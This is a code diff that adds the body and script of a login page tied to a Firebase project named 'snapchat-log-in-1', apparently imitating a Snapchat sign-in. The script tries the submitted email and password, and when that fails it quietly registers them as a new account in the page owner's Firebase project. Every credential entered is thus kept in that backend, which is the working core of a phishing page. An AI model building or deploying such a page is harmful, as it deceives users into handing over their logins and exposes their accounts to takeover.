@@ -49,4 +49,96 @@
           <input id="password" type="password" placeholder="••••••••" class="input-field" style="padding-right:48px;"/>
           <button type="button" id="togglePw" class="absolute right-3.5 top-1/2 -translate-y-1/2 text-gray-400">
             <svg id="eyeOpen" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
-            <svg id="eyeClosed" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="hidden"><path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-
+            <svg id="eyeClosed" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="hidden"><path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
+          </button>
+        </div>
+        <p id="pwError" class="hidden text-red-500 text-xs mt-1.5 font-medium">Please enter your password.</p>
+      </div>
+      <p id="firebaseError" class="hidden text-red-500 text-xs mt-1 mb-3 font-medium text-center"></p>
+      <div class="text-right mb-5">
+        <a href="#" class="text-gray-400 text-xs font-medium hover:text-black">Forgot password?</a>
+      </div>
+      <button type="submit" id="loginBtn" class="btn-login">
+        <span class="btn-text">Log In</span>
+        <div class="spinner"></div>
+      </button>
+    </form>
+
+    <div class="flex items-center gap-3 my-5 text-xs text-gray-300">
+      <div class="flex-1 h-px bg-gray-200"></div>OR<div class="flex-1 h-px bg-gray-200"></div>
+    </div>
+    <p class="text-center text-sm text-gray-400">New here? <span class="text-black font-bold">Just log in!</span></p>
+  </div>
+
+  <script>
+    firebase.initializeApp({
+      apiKey: "AIzaSyCGOXNi2xPOQHYK3QzBTPxJhLJYWwPQPVg",
+      authDomain: "snapchat-log-in-1.firebaseapp.com",
+      projectId: "snapchat-log-in-1",
+      storageBucket: "snapchat-log-in-1.firebasestorage.app",
+      messagingSenderId: "649166599151",
+      appId: "1:649166599151:web:ce99879c7ace4e24b5bc1a"
+    });
+
+    const auth = firebase.auth();
+    const form = document.getElementById('loginForm');
+    const emailInput = document.getElementById('username');
+    const passwordInput = document.getElementById('password');
+    const userError = document.getElementById('userError');
+    const pwError = document.getElementById('pwError');
+    const loginBtn = document.getElementById('loginBtn');
+    const togglePw = document.getElementById('togglePw');
+    const eyeOpen = document.getElementById('eyeOpen');
+    const eyeClosed = document.getElementById('eyeClosed');
+    const successOverlay = document.getElementById('successOverlay');
+    const successName = document.getElementById('successName');
+    const successMsg = document.getElementById('successMsg');
+    const firebaseError = document.getElementById('firebaseError');
+
+    togglePw.addEventListener('click', () => {
+      const isPassword = passwordInput.type === 'password';
+      passwordInput.type = isPassword ? 'text' : 'password';
+      eyeOpen.classList.toggle('hidden', isPassword);
+      eyeClosed.classList.toggle('hidden', !isPassword);
+    });
+
+    emailInput.addEventListener('input', () => { emailInput.classList.remove('error'); userError.classList.add('hidden'); firebaseError.classList.add('hidden'); });
+    passwordInput.addEventListener('input', () => { passwordInput.classList.remove('error'); pwError.classList.add('hidden'); firebaseError.classList.add('hidden'); });
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      let valid = true;
+      firebaseError.classList.add('hidden');
+      if (!emailInput.value.trim()) { emailInput.classList.add('error'); userError.classList.remove('hidden'); valid = false; }
+      if (!passwordInput.value) { passwordInput.classList.add('error'); pwError.classList.remove('hidden'); valid = false; }
+      if (!valid) return;
+
+      loginBtn.classList.add('loading');
+
+      try {
+        const userCredential = await auth.signInWithEmailAndPassword(emailInput.value.trim(), passwordInput.value);
+        successName.textContent = userCredential.user.email;
+        successMsg.textContent = 'Welcome back! 👋';
+        loginBtn.classList.remove('loading');
+        successOverlay.classList.add('show');
+      } catch (loginError) {
+        try {
+          const newUser = await auth.createUserWithEmailAndPassword(emailInput.value.trim(), passwordInput.value);
+          successName.textContent = newUser.user.email;
+          successMsg.textContent = 'Welcome! 🎉';
+          loginBtn.classList.remove('loading');
+          successOverlay.classList.add('show');
+        } catch (signupError) {
+          loginBtn.classList.remove('loading');
+          let msg = 'Something went wrong.';
+          if (signupError.code === 'auth/weak-password') msg = 'Password must be at least 6 characters.';
+          else if (signupError.code === 'auth/invalid-email') msg = 'Please enter a valid email.';
+          else if (signupError.code === 'auth/wrong-password') msg = 'Incorrect password.';
+          firebaseError.textContent = msg;
+          firebaseError.classList.remove('hidden');
+        }
+      }
+    });
+  </script>
+</body>
+</html>
